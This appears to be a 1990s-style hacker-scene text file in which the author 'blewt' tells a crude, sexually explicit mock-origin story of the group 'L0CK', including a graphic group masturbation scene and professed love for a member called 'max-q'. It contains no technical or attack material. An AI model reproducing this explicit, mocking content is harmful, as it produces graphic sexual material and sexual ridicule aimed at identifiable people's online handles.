    What is L0CK?
    ~~~~~~~~~~~~~
    Often while swimming around in the cyber ocean of textual fantasy
    that mortal man refers to as IRC, a fellow netsurfer will approach
    me with the oh so familiar question.  'What is L0CK?'.
    Now this is not something which a man can just spew out a predefined
    answer to in a few lines of text so I will use this forum as an
    appropriate vehicle for the telling of my tale.  I will tell you the
    story of L0CK and of my infinite love for max-q.

    Firstly I must ask of everyman that would approach me, 'Can you take
    it like a man?',  Are you rough and ready?,  Are you fond of the burn
    of whiskers one only feels with the face of another man, another
    warrior pressed against his as lips are locked in the forbidden embrace?
    If you answered 'YES!  GIVE IT TO ME HARD!' to all of the above then
    you are well on your way to discovering the answer to your query.

    I am blewt, this is the handle which I have chosen for myself.  It
    has a certain flair when it is bellowed out in the heat of passion
    by my male companions.  'OH BLEWT, OH BLEWT'  This has caused many
    a goose bumped buttocks in the past and will continue to cause many
    more in the future.  Yes, I am blewt and I have chosen this life,
    this life that myself and my L0CK brothers have defined for ourselves.
    I am Happy, I cry when hurt like any other man and I weep for the
    hungry and destitute.

    It was a saturday night, my first week in college when I found myself
    sitting on a rough wooden crate.  There were 6 crates gathered in a
    circle, each with a man, a warrior perched upon it.  My naked buttocks
    bled as the force of what I was doing drove splinters from the crate
    deep within my now raw flesh.  My hand was clenched around my pulsating
    manhood as I furiously pounded it and I was nervous.  Yes, it was my
    very first circle jerk...  But in the bold fashion which now defines
    L0CK, I did not let my fears best me, I manhandled my moist missle of
    manhood like a veteran pizza party pud pounder!  It was while beating
    furiously that I looked up at the man across from me.  The man that I
    beheld took my breath away, his hair was cut in a perfect line all the
    way around his head, he was short like a leprechaun and his sunken
    chest added a flair that made him all the more adorable.  I must have
    this odd little man dressed in a submainer's uniform, my dwarven popeye,
    my love, MY MAN!, MY MAX-Q@!#@!

    And it was then that my phallus exploded with the rage of a 1000 virgins,
    slamming me violently off the wall as my seed shot forth and marinated the
    pizza lying patiently on the floor between us.  Yes, I had been the
    1st to baptize the pizza with my sperm, I had won the race for mankind
    and for max-q.  It was in that mystical union of man, sperm and pizza
    that L0CK was born..

    And my life began...

    Carpe Diem,
    -blewt
